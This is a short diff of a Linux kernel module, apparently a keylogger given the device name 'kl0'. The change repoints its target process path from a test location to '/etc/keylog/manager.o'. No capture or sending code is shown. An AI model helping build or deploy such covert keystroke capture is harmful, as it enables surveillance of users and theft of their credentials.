@@ -34,7 +34,7 @@ MODULE_LICENSE("GPL");
 #define DEVICE_NAME "kl0"
 unsigned major;
 
-static char* target_process = "/home/vagrant/test";
+static char* target_process = "/etc/keylog/manager.o";
 
 #ifndef BUFLEN
 #define BUFLEN 1024
